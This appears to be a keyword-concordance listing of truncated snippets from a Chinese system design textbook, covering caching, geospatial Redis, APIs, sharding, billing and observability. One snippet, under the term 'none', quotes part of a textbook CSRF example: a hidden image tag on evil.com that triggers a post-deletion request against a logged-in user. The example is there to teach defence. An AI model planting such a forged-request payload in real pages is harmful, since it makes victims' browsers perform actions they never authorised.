  c09_b08.md: ...#### REST——Representational State Transfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、PUT、DE...

=== georadius (3 occurrences) ===
  c06_b10.md: ...y)   对“5km 内司机”查询，使用**带地理空间索引的 Redis**（Redis 原生支持 `GEOADD`、`GEORADIUS` 命令）。所有当前司机位置都能放进内存（50,000 名司机 × 约 100 字节 = 5 MB）。`GEORADIU...
  c06_b10.md: ...EORADIUS` 命令）。所有当前司机位置都能放进内存（50,000 名司机 × 约 100 字节 = 5 MB）。`GEORADIUS` 复杂度为 O(N+log(M))，N 是结果数——对有界半径基本为常数时间。       GEOADD driver...
  c06_b10.md: ...时间。       GEOADD drivers 37.7749 -122.4194 "driver:123"     GEORADIUS drivers -122.4 37.77 5 km → ["driver:123", "driver:456", .....

=== drivers (3 occurrences) ===
  c06_b10.md: ...pdated_at: 1705312000}     TTL: 30 seconds (expire inactive drivers automatically)   对“5km 内司机”查询，使用**带地理空间索引的 Redis**（Redis 原生...
  c06_b10.md: ...RADIUS` 复杂度为 O(N+log(M))，N 是结果数——对有界半径基本为常数时间。       GEOADD drivers 37.7749 -122.4194 "driver:123"     GEORADIUS drivers -122.4...
  c06_b10.md: ...GEOADD drivers 37.7749 -122.4194 "driver:123"     GEORADIUS drivers -122.4 37.77 5 km → ["driver:123", "driver:456", ...]   **第...

=== location (3 occurrences) ===
  c06_b10.md: ...：  **第一层：Redis（键值存储）存当前位置：**       Key: "driver:{driver_id}:location"     Value: {lat: 37.7749, lon: -122.4194, updated_at: 1705...
  c25_b03.md: ...4 秒，每位活跃司机的移动应用发送一个 HTTP 请求：      POST /driver/{driver_id}/location     { "lat": 37.7749, "lng": -122.4194, "timestamp": 171400...
  c25_b03.md: ...作；10 节点的分片 Redis 集群轻松处理 500 万操作/秒。司机当前位置存为简单键值：`driver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geohash 索引  为让匹配服...

=== tag (3 occurrences) ===
  c06_b11.md: ...INTEGER REFERENCES posts(id) ON DELETE CASCADE,         tag         VARCHAR(100) NOT NULL,         created_at  TIMESTAM...
  c06_b11.md: ...d_at ON hashtags(created_at);   热门 hashtag 查询：       SELECT tag, COUNT(*) as count     FROM hashtags     WHERE created_at >...
  c06_b11.md: ...WHERE created_at > NOW() - INTERVAL '24 hours'     GROUP BY tag     ORDER BY count DESC     LIMIT 10;   **Tradeoff（权衡）：** 如...

=== type (3 occurrences) ===
  c06_b12.md: ...metadata        JSONB  -- variable fields per note type     );   `clinical_notes` 上的 `JSONB` 列处理可变元数据，无需单独文档存储。如果需要...
  c08_b12.md: ...计：**  通知服务在插入前检查：       INSERT INTO notifications (user_id, type, source_event_id, post_id, actor_id)     VALUES (7, 'post_l...
  c09_b16.md: ...cket 推送** 如果 Alice 在线（在 Redis 注册了活动 WebSocket 连接）：       { "type": "notification_count_update", "count": 7 }   该消息通过 Alice 的...

=== new (3 occurrences) ===
  c07_b03.md: ...Content Delivery Network，CDN）** 是地理分布的缓存服务器网络。当 Tokyo 的用户请求 New York 服务器上的图片时，他们不必等待往返（仅网络延迟就约 150ms）。相反，CDN 在 Tokyo 有一台缓存服...
  c07_b04.md: ...- Return the value to the caller   写入新值：       1. Write the new value to the database     2. Invalidate (delete) the old ca...
  c09_b08.md: ...tch user 42     POST /users                      → create a new user     PUT  /users/42                   → replace user 42...

=== hit (3 occurrences) ===
  c07_b04.md: ...取一个值：       1. Look up the key in the cache     2. If cache HIT:        - Return the cached value     3. If cache MISS:...
  c07_b05.md: ...success   **读取路径：**       1. Check cache — almost always a HIT (cache is always up to date)     2. On miss (first access o...
  c07_b07.md: ...if cached:             return json.loads(cached)  # Cache hit          # Cache miss — query database         profile = db...

=== check (3 occurrences) ===
  c07_b05.md: ...e value to cache     3. Return success   **读取路径：**       1. Check cache — almost always a HIT (cache is always up to date)...
  c07_b07.md: ...):         cache_key = f"user:{user_id}:profile"          # Check cache         cached = redis.get(cache_key)         if cach...
  c08_b11.md: ...event(event):         user_id = event['user_id']          # Check if we already sent the welcome email         already_sent =...

=== carlos (3 occurrences) ===
  c07_b08.md: ...数据库负载大幅下降，延迟改善，原本会压垮 v1 的病毒式流量尖峰现在被缓存吸收。  但随后收到一个 bug 报告。用户 Carlos 在 14:07 更新了他的简介。他的朋友 14:08 访问他的资料，看到的是旧简介。到 14:13（TTL 过期后），...
  c07_b08.md: ...说，缓存按设计工作。`update_user_profile` 函数在资料更新时会使缓存失效。但报告揭示了一个微妙之处：Carlos 用手机应用更新简介，而手机应用使用不同的代码路径，它更新了数据库但没有使 Redis 缓存失效。  这是 Social...
  c07_b08.md: ...缓存失效”到底是什么？  缓存失效是确定缓存值何时已变陈旧并采取行动的问题。挑战在于，“陈旧”并不总是显而易见：  * Carlos 的简介更新：写入后缓存立即陈旧 * 热门帖子列表：随着新帖子创建和点赞而变陈旧 * 汇率：市场每次变动就变陈旧 * 渲...

=== recency (3 occurrences) ===
  c07_b15.md: ...高峰期间每隔几分钟就有新帖。2 分钟 TTL 意味着 Feed 数据最多 2 分钟旧——对社交 Feed 可接受，精确 recency 并不关键。足够短，用户在合理窗口内看到新帖；足够长，提供有意义的缓存保护。  **驱逐策略：** LRU。最近没加载...
  c22_b05.md: ...quality_weight × quality(post)           + recency_weight × recency(post.timestamp)  其中 `affinity`、`quality`、`recency` 归一化到 [0,...
  c22_b05.md: ..._weight × recency(post.timestamp)  其中 `affinity`、`quality`、`recency` 归一化到 [0, 1]，权重之和为 1。  权重不是手动指定——而是从用户行为中学习。如果 A/B 测试中提高 `a...

=== analytics (3 occurrences) ===
  c08_b04.md: ...ivers to Email Service (subscriber)         ├── delivers to Analytics Service (subscriber)         ├── delivers to Contact Notifi...
  c28_b20.md: ...** 60 名工程师时的目标架构：6 个服务（Auth、User、Product/Core、Notifications、Analytics、Platform/Infra），每个团队 10 人。倒推：阶段 1（0–6 个月，10 → 20 人）：还不分解。往单...
  c28_b20.md: ...这两个服务分离后，团队可独立部署。阶段 3（12–18 个月，35 → 50 人）：提取 User Service 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 service mesh 和分布式追踪——可观测...

=== publish (3 occurrences) ===
  c08_b07.md: ...r into PostgreSQL (REQUIRED — user must exist)         ↓ 2. Publish "user.signup" event to message queue (fast, ~2ms)         ↓...
  c15_b07.md: ...ommit the payment record to the database     COMMIT;     // Publish event to message queue: "payment.charge.succeeded"   数据库提交与...
  c15_b07.md: ...溃，支付记录已保存但事件从未发布。Saga 卡住——没有事件意味着下一步永远不运行。  另一种顺序：       // Publish event to message queue: "payment.charge.succeeded"     BEGI...

=== into (3 occurrences) ===
  c08_b07.md: ...Application Server (HTTP handler)         ↓ 1. Insert user into PostgreSQL (REQUIRED — user must exist)         ↓ 2. Publis...
  c25_b06.md: ...'COMPLETED_UNBILLED' THEN         -- 计算最终车费         INSERT INTO billing_ledger (trip_id, amount, type) VALUES (X, fare, 'CH...
  c25_b06.md: ...d, amount, type) VALUES (X, fare, 'CHARGE');         INSERT INTO billing_ledger (trip_id, amount, type) VALUES (X, driver_pa...

=== reads (3 occurrences) ===
  c08_b07.md: ...background...)     Queue Consumer: Email Service         ← reads "user.signup" event from queue         ← sends welcome emai...
  c08_b07.md: ...the user)      Queue Consumer: Analytics Service         ← reads "user.signup" event from queue         ← logs the event (50...
  c08_b07.md: ...Queue Consumer: Contact Notification Service         ← reads "user.signup" event from queue         ← notifies connected...

=== bio (3 occurrences) ===
  c09_b09.md: ...int64 id = 1;       string username = 2;       string bio = 3;     }   基于这个定义，gRPC 自动生成多语言（Go、Python、Java、Node.js 等）的...
  c16_b18.md: ...“Software Engineer”。EU 数据中心接受该写。 4. 下午 3:30，网络分区恢复。US 数据中心上 bio = "Engineer at SocialSnap"；EU 数据中心上 bio = "Software Enginee...
  c16_b18.md: ...:30，网络分区恢复。US 数据中心上 bio = "Engineer at SocialSnap"；EU 数据中心上 bio = "Software Engineer"。同一条记录有两个冲突值。  这就是脑裂。没有冲突解决策略，就必须丢弃一个写...

=== home (3 occurrences) ===
  c09_b14.md: ...问题  **Q1.** SocialSnap 考虑把移动 API 从 REST 换成 GraphQL。移动应用现在渲染 home feed 需要 4 个 REST 调用：`GET /users/{id}`、`GET /feed`、`GET /use...
  c09_b14.md: ...一个屏幕需要 4 个独立 REST 调用。每次调用在移动网络上都是一次独立往返（每个约 50-100ms）。串行请求时 home feed 可渲染前的总时间：200-400ms；即使并行也需要约 100-150ms。GraphQL 会把这 4 个调...
  c09_b17.md: ...个组件的工作。  但如第 7 章所述：CDN 缓存只适用于所有用户都相同的内容（公开、非个性化）。Alice 登录后的 home feed——个性化、动态——不能在页面级缓存到 CDN。  **Q2.**（联系第 8 章消息队列）一个带粘性会话的负...

=== resolver (3 occurrences) ===
  c09_b14.md: ...。缓存必须在应用层处理——要么在 GraphQL 客户端（如 Apollo Client 的规范化缓存），要么在服务器 resolver 层（用 Redis，见第 7 章）。  服务器端复杂度：REST 端点是简单的数据库查询。GraphQL 服务器需要...
  c09_b14.md: ...章）。  服务器端复杂度：REST 端点是简单的数据库查询。GraphQL 服务器需要 schema 定义、每个字段的 resolver，以及防止深嵌套查询（查询深度限制、复杂度限制）的保护，避免产生巨大数据库负载。  **推荐：**  GraphQL 对...
  c09_b14.md: ...QL 对移动 API 是正确选择，但有两个条件：  1. 实现查询深度和复杂度限制，防止滥用查询。 2. 为 feed resolver 实现应用层缓存（用短 TTL 缓存渲染后的 feed，如第 7 章讨论），弥补失去 HTTP 层缓存的影响。  4→1...

=== seek (3 occurrences) ===
  c10_b11.md: ...提供分层目录结构，客户端挂载后像本地磁盘一样使用。多个客户端可同时读写文件。文件操作——open、read、write、seek、append——在字节级别工作，文件系统维护元数据（权限、修改时间、目录结构）。  **对象存储**提供扁平的 key...
  c24_b02.md: ...立交付并随时切换。   #### 为什么要分段？  为什么把视频切成 2–10 秒片段而非一个大文件？三个原因：  **Seek 支持：** 观众跳到特定时间戳时，播放器可从最近的片段边界开始下载，而无需下载并丢弃该点之前的所有字节。  **自适应...
  c24_b07.md: ...缘缓存 | 对缓存内容极低 | 最终一致（缓存 TTL） | 极高 | 中（CDN 配置、失效） 分段视频文件 | 低 seek 延迟 | 不适用 | 高（片段独立获取） | 中（转码时生成片段） 分层存储（热/温/冷） | 热数据低、冷数据高 |...

=== parquet (3 occurrences) ===
  c10_b18.md: ...例子：Amazon Redshift、Google BigQuery、Spark 或 Trino 查询的 Apache Parquet 文件、ClickHouse。  列式存储把每列单独写。对上述查询，数据库只读取 `user_id`、`tags`、`c...
  c10_b18.md: ...ka，第 8 章）。 2. 流处理器（Spark Streaming、Flink）从 Kafka 读取，把事件批量写成 Parquet 文件，每几分钟写入对象存储（S3）。 3. 分析数据库（Redshift、BigQuery 或 Athena）在查询时...
  c10_b18.md: ...写入对象存储（S3）。 3. 分析数据库（Redshift、BigQuery 或 Athena）在查询时从 S3 读取 Parquet 文件，使用列式访问和谓词下推，在数秒内回答“#systemdesign 按国家浏览量”。 4. 频繁访问的聚合（每个标...

=== none (3 occurrences) ===
  c11_b04.md: ...ata = redis.get(f"session:{session_id}")         if data is None:             return None  # Session expired or invalid...
  c11_b04.md: ...:{session_id}")         if data is None:             return None  # Session expired or invalid         return json.loads(dat...
  c19_b07.md: ...ttps://socialsnap.com/posts/delete?id=12345" style="display:none">   当登录的 SocialSnap 用户访问 `evil.com` 时，浏览器加载这个“图片”——实际上是向 So...

=== setex (3 occurrences) ===
  c11_b04.md: ..., "username": username, "created_at": now()}          redis.setex(             f"session:{session_id}",   # key             3...
  c11_b14.md: ...ELECT * FROM users WHERE id = %s", [user_id])         redis.setex(cache_key, 300, json.dumps(profile))  # 共享 Redis         re...
  c11_b15.md: ...erate_presigned_url(user_id, expires_in=3600)         redis.setex(cache_key, 3500, url)  # TTL 略短于 URL 过期时间         return ur...

=== nova (3 occurrences) ===
  c12_b05.md: ...基于哈希分片，特定模式也会造成热 shard：**热 key**。想象 SocialSnap 有一位名人用户——叫她 @nova——有 2000 万（20 million）粉丝。每次 @nova 发帖，都会触发 2000 万条 feed 更新。所有...
  c12_b05.md: ...想象 SocialSnap 有一位名人用户——叫她 @nova——有 2000 万（20 million）粉丝。每次 @nova 发帖，都会触发 2000 万条 feed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3...
  c12_b05.md: ...有 2000 万（20 million）粉丝。每次 @nova 发帖，都会触发 2000 万条 feed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分...

=== center (3 occurrences) ===
  c14_b13.md: ...数据中心把 `us-east` 从 1203 本地递增到 1204。  任何用户看到的点赞总数是所有 per-data-center 计数器之和：本例中 1203 + 847 + 412 = 2462。每个数据中心从本地 per-data-center...
  c14_b13.md: ...center 计数器之和：本例中 1203 + 847 + 412 = 2462。每个数据中心从本地 per-data-center map 副本计算该总和。  收敛期间：数据中心定期互相复制它们的 per-data-center map。合并操作很简...
  c14_b13.md: ...地 per-data-center map 副本计算该总和。  收敛期间：数据中心定期互相复制它们的 per-data-center map。合并操作很简单——对每个数据中心计数器取最大值。如果 EU 节点有 `{"us-east": 1200, "e...

=== idempotency (3 occurrences) ===
  c25_b06.md: ...处理器调用失败，用幂等意图记录重试——扣款尝试有唯一 ID，即使多次发送同一请求，支付处理器也不会重复扣款。这就是 **idempotency key（幂等性键）** 模式，在分布式系统中对 exactly-once 金融操作至关重要。  * * *...
  c25_b13.md: ...is 存位置，PostgreSQL 存行程和计费状态）明确容纳两者。  **计费** 应用第 5 章 ACID 属性和 idempotency key（幂等性键）模式，确保在网络故障和重试下的 exactly-once 金融交易事务（transaction）。...
  c28_b13.md: ...| 失败时更高（重试延迟） | 可能造成重复操作（非幂等） | 更高——从瞬时故障恢复 | 低——必须处理幂等性 **Idempotency keys** (Ch 16, 25) | 微小开销（键检查） | 强——精确一次语义 | N/A | 低 **Dist...

=== fatal (3 occurrences) ===
  c17_b04.md: ...区歧义会造成抓狂的调试会话。 2. **Severity level**——DEBUG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DEBUG。 3. **Service and...
  c17_b05.md: ...知重试 3 次后仍失败”。每条 ERROR 都应可行动——如果一个错误经常发生却没人处理，它可能被误分类或配置错误。  FATAL 日志记录进程无法恢复并即将退出的失败：“无法绑定端口 8080”、“配置文件损坏”。FATAL 日志应触发 pager...
  c17_b05.md: ...被误分类或配置错误。  FATAL 日志记录进程无法恢复并即将退出的失败：“无法绑定端口 8080”、“配置文件损坏”。FATAL 日志应触发 pager 告警。   #### 侦探与日志  回想第 3 章的福尔摩斯估算方法——从部分证据推理到确信结...

=== spans (3 occurrences) ===
  c17_b06.md: ...式追踪  **分布式追踪（distributed trace）** 是单次请求通过分布式系统的端到端旅程记录。它由 **spans** 组成——每个 span 是一个工作单元，带开始时间和持续时间——以树形结构组织，每个 span 可能有子 span...
  c17_b07.md: ...唯一）、parent span ID、服务名、操作名、开始时间戳、结束时间戳，以及附加到 span 的标签或日志。  Spans 被发送到一个集中式追踪后端（Jaeger、Zipkin、Honeycomb、Datadog APM），它通过 trac...
  c17_b12.md: ...后增长意味着用户等待太久）而不是基础设施指标（CPU、内存）。  **Q3.** 一次用户登录请求的分布式追踪显示以下 spans：API Gateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span...

=== pull (3 occurrences) ===
  c18_b02.md: ...类 bug：真实数据库查询 bug、真实序列化错误、真实认证流程问题。  集成测试应在 CI（持续集成）中运行——每次 pull request 自动运行——但因为速度较慢，不必作为本地开发循环的一部分。...
  c19_b16.md: ...AM 角色、服务账户）。权限作为代码定义在基础设施即代码（Terraform、CloudFormation）中，并通过 pull request 审查。权限变更与代码变更走相同审查流程。 * **“足够最小权限”的权限集：** 不必微观精确，而是为...
  c22_b02.md: ...个账户） 2. 对每个被关注账户，获取其最近帖子 3. 合并所有帖子并排序 4. 返回排序后的 feed  这就是 **pull 模型**：feed 在读取时按需计算。  **优点：** 写入成本极小——发帖无论关注者多少都很便宜。没有预计算数据变...

=== graduated (3 occurrences) ===
  c18_b05.md: ...**准备停止按钮**——每个混沌实验都应能立即停止。实验期间应有人盯着监控，准备在看到比预期更糟时停止。 5. ** graduated 到生产**——对 staging 中已证明能处理的特定失败建立信心后，在低流量时段在生产运行相同实验。目标是持续验证生...
  c18_b14.md: ...7 章）和熔断器（第 16 章），受控实验可以快速停止；(c) 团队先在 staging 实验，只把理解充分的失败模式 graduated 到生产。  综合：混沌工程不是“故意制造 outage”。做好时，它是“故意引入特定、有界、被监控的失败，以验证系统按...
  c18_b14.md: ...监控和回滚流程就绪时 kill。目标是让潜在失败在成为意外事件前浮出水面。  对大多数服务用户的生产系统（非生命安全），graduated 混沌工程——先在 staging、后在低流量时段生产，配合优秀可观测性——既负责任又有价值。  **Q2.** 功能开...

=== authorization (3 occurrences) ===
  c19_b03.md: ...ler 希望访问：读取你的帖子、代表你发帖。允许或拒绝？” 2. 用户点击“允许”。SocialSnap 生成一个 **authorization code**，并把用户重定向回 PostScheduler。 3. PostScheduler 把这个 authori...
  c19_b03.md: ...ization code**，并把用户重定向回 PostScheduler。 3. PostScheduler 把这个 authorization code 发到 SocialSnap 的 token 端点（server-to-server，不经过用户浏览器）。So...
  c19_b03.md: ...refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authorization: Bearer eyJhbGciOi...`。SocialSnap 验证 token 并按用户权限处理请求。 5. A...

=== code (3 occurrences) ===
  c19_b03.md: ...子、代表你发帖。允许或拒绝？” 2. 用户点击“允许”。SocialSnap 生成一个 **authorization code**，并把用户重定向回 PostScheduler。 3. PostScheduler 把这个 authorizatio...
  c19_b03.md: ...，并把用户重定向回 PostScheduler。 3. PostScheduler 把这个 authorization code 发到 SocialSnap 的 token 端点（server-to-server，不经过用户浏览器）。SocialS...
  c28_b15.md: ...| N/A | N/A | 随时间改善（从失败中学习） | 低——只需流程纪律 **Infrastructure as Code** (Ch 28) | N/A | 基础设施状态确定性 | 极高（可复现环境） | 中——IaC 工具学习曲线 **S...

=== mtls (3 occurrences) ===
  c19_b10.md: ...只要正确写代码） | 防止 SQL 注入 CSRF token | 可忽略 | 无 | 低 | 防止 CSRF 零信任 mTLS | 中（每次连接握手） | 略降（证书过期导致失败） | 高（证书轮换、PKI 管理） | 防止横向移动 静态加密 |...
  c19_b10.md: ...） | 防止磁盘被盗  观察：大多数基础安全实践（参数化查询、CSRF token、TLS）开销可忽略。昂贵的是零信任 mTLS——它是否值得取决于威胁模型。  你的威胁模型是什么？一个没有已知对手、没有支付数据的初创公司可以合理推迟零信任 mTL...
  c19_b10.md: ...TLS——它是否值得取决于威胁模型。  你的威胁模型是什么？一个没有已知对手、没有支付数据的初创公司可以合理推迟零信任 mTLS。处理支付数据的金融服务公司、处理医疗记录的医疗保健公司，无论成本如何都应实现它。拥有高价值数据并吸引复杂攻击者的系统—...

=== patterns (3 occurrences) ===
  c23_b04.md: ...| "distributed computing and consistency（一致性）" 4 | "design patterns for reliability"  用户搜索 "distributed systems（分布式系统）"。朴素做法是扫描...
  c26_b12.md: ...*Q2.** 全书都在为本章铺垫。前五个部分——Foundations、Building Blocks、Scaling Patterns、Reliability、Case Studies——中哪个概念最直接重现在分布式键值存储设计中？...
  c26_b13.md: ...第 6 章（NoSQL）的主题——现在我们看到其内部。复制机制呼应第 12 章数据库复制模式（下一章）。Scaling Patterns（第 11–15 章）：虚拟节点（第 12 章分片概念）分布负载。水平扩展原则（第 11 章）适用：任何节点可处理任何请...

=== run (3 occurrences) ===
  c23_b05.md: ...收益。 5. **词干提取或词形还原：** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distr...
  c23_b05.md: ...可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排索引更新：** 对每个剩余 token，把该文档的 I...
  c28_b22.md: ...`DROP COLUMN` 的迁移需要 senior 工程师的第二次批准才能合并。(4) **在生产中预迁移 dry-run**（负责：Platform 团队，期限：3 周）：实现迁移影子模式，先在生产副本上运行迁移 SQL 并分析查询计划，再...

=== trie (3 occurrences) ===
  c23_b07.md: ...过什么以 "dist" 开头？以 "dist" 开头的前 10 个最频繁搜索查询就是建议。  前缀查找的数据结构是 **trie** —— 一种树，每条边代表一个字符，每个节点代表一个前缀，叶节点包含完整词。要找到所有以 "dist" 开头的查询，...
  c23_b07.md: ...—— 一种树，每条边代表一个字符，每个节点代表一个前缀，叶节点包含完整词。要找到所有以 "dist" 开头的查询，遍历 trie 到代表 "dist" 的节点并返回所有补全。  网络规模下，所有查询的单个 trie 太大无法放入内存。解决方案是为每...
  c23_b07.md: ..."dist" 开头的查询，遍历 trie 到代表 "dist" 的节点并返回所有补全。  网络规模下，所有查询的单个 trie 太大无法放入内存。解决方案是为每个前缀预计算一组有限的热门建议，并缓存在小型键值存储中。预计算作为批处理作业定期（如每...

=== accepted (3 occurrences) ===
  c25_b01.md: ...活跃司机每 4 秒发送一次位置更新 * 向乘客和司机显示 ETA 并持续更新 * 行程状态机：REQUESTED → ACCEPTED → DRIVER_ARRIVING → IN_TRIP → COMPLETED → BILLED * 当某区域需求超过...
  c25_b04.md: ...管理。每个状态转换（REQUESTED → OFFERED_TO_DRIVER、OFFERED_TO_DRIVER → ACCEPTED 等）必须是原子的——两位司机不能同时把请求转换到 ACCEPTED。   #### 匹配的一致性——为什么不能在这里用...
  c25_b04.md: ...RIVER、OFFERED_TO_DRIVER → ACCEPTED 等）必须是原子的——两位司机不能同时把请求转换到 ACCEPTED。   #### 匹配的一致性——为什么不能在这里用最终一致性  这是拼车系统与 SocialSnap feed（第 2...

=== billed (3 occurrences) ===
  c25_b01.md: ...UESTED → ACCEPTED → DRIVER_ARRIVING → IN_TRIP → COMPLETED → BILLED * 当某区域需求超过供给时自动激活动态加价（surge pricing） * 金融交易事务（transaction）（...
  c25_b06.md: ...river_payout, 'CREDIT');         UPDATE trips SET status = 'BILLED' WHERE trip_id = X;       END IF;     COMMIT;  `FOR UPDATE`...
  c25_b06.md: ...现幂等性（idempotency）：若计费被触发两次（如因网络超时导致计费服务重试），第二次发现 `status = 'BILLED'` 后什么都不做。  实际对乘客信用卡扣款通过外部支付处理器（Stripe、Braintree）完成。外部调用有自己的...

=== lng (3 occurrences) ===
  c25_b03.md: ...POST /driver/{driver_id}/location     { "lat": 37.7749, "lng": -122.4194, "timestamp": 1714000000 }  位置更新流水线：  1. **负载均衡...
  c25_b03.md: ...集群轻松处理 500 万操作/秒。司机当前位置存为简单键值：`driver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，系统维护反...
  c25_b10.md: ...4 秒 = 125,000 写入/秒。每司机存储：`driver:{id}:location` 存 lat（8 字节）、lng（8 字节）、geohash（8 字节）、timestamp（8 字节）≈ 32 字节/键。加上 geohash 索引开...

=== commit (3 occurrences) ===
  c25_b06.md: ...SET status = 'BILLED' WHERE trip_id = X;       END IF;     COMMIT;  `FOR UPDATE` 锁防止两个并发进程同时计费同一行程。状态检查实现幂等性（idempotency）：若计费...
  c25_b06.md: ...己的故障模式：支付处理器可能慢、拒卡或超时。计费服务必须优雅处理这些故障而不重复扣款。  模式：**Two-Phase Commit（概念上）：** 首先在自己的数据库中记录扣款意图（幂等性，idempotency）。然后调用支付处理器。若支付处理器调...
  c28_b12.md: ...强（事件日志是真相来源） | 极高（日志只追加、持久） | 极高——事件 schema 演进 **Two-phase commit (2PC)** (Ch 12) | 极高（两次网络往返） | 强（分布式 ACID） | 低——任何参与者失败阻塞提交...

=== mod (3 occurrences) ===
  c26_b01.md: ...定 N 个节点和数百万键，哪个节点负责哪些键？  朴素方法：`responsible_node = hash(key) mod N`。若哈希产生均匀分布，键大致均匀分布在 N 个节点上。  问题：添加或删除节点时，N 改变。N=5 时，键 "us...
  c26_b01.md: ...题：添加或删除节点时，N 改变。N=5 时，键 "user:123" 哈希到节点 2（hash("user:123") mod 5 = 2）。添加节点后 N=6，hash("user:123") mod 6 可能是 4。几乎所有键的责任节点改变—...
  c26_b01.md: ...节点 2（hash("user:123") mod 5 = 2）。添加节点后 N=6，hash("user:123") mod 6 可能是 4。几乎所有键的责任节点改变——需要全量数据迁移。向 5 节点集群添加一个节点导致 80% 的键重新定位。...

=== clock (3 occurrences) ===
  c26_b07.md: ...副本分歧检测问题 4. **基于 gossip 的成员管理：** 无中央协调器解决集群成员问题 5. **Vector clock 冲突解决：** 处理两个客户端同时写同一键且写入到达不同副本的情况  Dynamo 论文是分布式系统设计分水岭：它证明...
  c26_b12.md: ...不同值，都认为自己最新。Dynamo 论文引入 **vector clocks** 跟踪每次写的因果历史。Vector clock 是每键的（节点，版本）对列表，记录哪些节点见过该键的哪个版本。当两次写冲突（彼此无因果后继）时，系统通过比较 vect...
  c28_b10.md: ...y** (Ch 4) | 中——因果元数据开销 | 因果——保证“看到自己的写” | 高 | 高——需要 vector clock 等    （术语译法：一致性（consistency）、可用性（availability）、最终一致性（eventua...

=== lag (3 occurrences) ===
  c28_b03.md: ...小时。  **Runbook：** 已知故障模式的文档化流程。当数据库副本落后时，runbook 写：第 1 步，检查 lag 查询；第 2 步，审查慢查询日志；第 3 步，若 lag > 30 分钟（30 minutes）则重启副本。Runbo...
  c28_b03.md: ...程。当数据库副本落后时，runbook 写：第 1 步，检查 lag 查询；第 2 步，审查慢查询日志；第 3 步，若 lag > 30 分钟（30 minutes）则重启副本。Runbook 把隐性知识（上次调试该问题的工程师脑子里的东西）变成...
  c28_b10.md: ...h 2) | 有副本时读延迟更低 | 最终（异步副本）；强（同步） | 更高——主库故障读仍存活 | 中——需监控复制 lag **Strong consistency** (Ch 4 ACID) | 更高——需要写协调 | 强——所有读者看到最...

=== aiops (3 occurrences) ===
  c28_b07.md: ...### 28.5 AIOps——运维中的机器学习  本书描述的系统产生海量可观测数据：每秒数百万日志行、每秒更新数千指标、每个请求的分布式追踪。人类...
  c28_b07.md: ...产生海量可观测数据：每秒数百万日志行、每秒更新数千指标、每个请求的分布式追踪。人类监控和推理如此体量的能力有限。  **AIOps**（Artificial Intelligence for IT Operations，IT 运维人工智能）把机器学习...
  c28_b07.md: ...已知修复措施的情况，无需人工干预即可触发自动响应——重启服务、增加连接池大小、故障转移数据库。缩短平均修复时间。  在 AIOps 增强系统中，工程师角色从“盯着仪表板找问题”转变为“定义正常是什么样子、验证自动响应、调查 ML 模型不认识的新奇故障...

=== mesh (3 occurrences) ===
  c28_b12.md: ...服务间调用更高；整体更低（独立扩展） | 服务内强；服务间最终 | 高——部分失败而非整体 | 极高——service mesh、分布式追踪 **Service mesh** (Ch 13) | 轻微开销（sidecar 代理） | N/A | 极...
  c28_b12.md: ...服务内强；服务间最终 | 高——部分失败而非整体 | 极高——service mesh、分布式追踪 **Service mesh** (Ch 13) | 轻微开销（sidecar 代理） | N/A | 极高（熔断、重试） | 极高——Istio/...
  c28_b20.md: ...vice 和 Analytics Service。围绕它们组建团队。核心单体现在更小。进一步分解前建立 service mesh 和分布式追踪——可观测性必须领先于分解。阶段 4（18–24 个月，50 → 60 人）：提取最后两个服务。所有 6...

=== sqlite (2 occurrences) ===
  c01_b09.md: ...起来便宜、以后撤销却灾难性昂贵的决策）。  **创始人正确的时候：** 为一个三人初创团队建完整的微服务架构是浪费。当 SQLite 就够用时写自定义分布式数据库是浪费。第一个版本应该简单、快速可部署、易于理解。大多数早期架构决策可以在需要时更改。...
  c18_b02.md: ...统行为  每一层捕获不同类别的 bug。针对真实 PostgreSQL 实例的服务集成测试能捕获“这条 SQL 查询在 SQLite 单元测试中通过，但在 PostgreSQL 上有语法错误”。契约测试捕获“feed 服务改成返回 `authorNam...

=== law (2 occurrences) ===
  c02_b02.md: ...致如下：       Throughput ≈ Concurrency / Latency   这是 Little's Law（利特尔法则）的非正式表达。如果每个请求花 10 毫秒，同时有 100 个并发请求在飞行中，你的吞吐是 100 / 0....
  intro.md: ...，把需求呈现为一个谜题——而这正是真实工程团队设计讨论的实际方式。  最后一章跳出架构，审视人的层面：Conway's Law（康威定律）如何意味着组织架构无论你是否愿意都会塑造系统，blameless post-mortems（无追责事后复盘）...

=== least (2 occurrences) ===
  c02_b09.md: ...分布式系统中的 exactly-once 语义，代价很高（第 15 章）。那 0.5% 的 miss 率就是使用 at-least-once 配送加去重（deduplication），而不是更复杂的 exactly-once 方案的成本。  **Q2...
  c28_b11.md: ...Round-robin load balancing** (Ch 9) | 无延迟开销 | N/A | 高 | 低 **Least-connections load balancing** (Ch 9) | 避免慢后端而更低 | N/A | 高 |...

=== writes (2 occurrences) ===
  c02_b09.md: ...有人透支，或柜员给出错误信息。由于旧读导致双花（同一笔钱花两次）会终结业务。需要强一致性，或至少强 read-your-writes 一致性。...
  c26_b06.md: ...cialSnap v4，第 11 章）：存储用户会话 token。N=3，W=2，R=2。会话需要 read-your-writes 一致性（你登录后，下个请求必须找到会话）。W + R = 4 > N = 3，读 quorum 保证与写 quorum...

=== your (2 occurrences) ===
  c02_b09.md: ...——就可能有人透支，或柜员给出错误信息。由于旧读导致双花（同一笔钱花两次）会终结业务。需要强一致性，或至少强 read-your-writes 一致性。...
  c26_b06.md: ...**（SocialSnap v4，第 11 章）：存储用户会话 token。N=3，W=2，R=2。会话需要 read-your-writes 一致性（你登录后，下个请求必须找到会话）。W + R = 4 > N = 3，读 quorum 保证与写...

=== confirmed (2 occurrences) ===
  c02_b10.md: ...User → Payment Service → Notification Service → "Order confirmed"   改成异步模式：       User → Payment Service → (publish "order p...
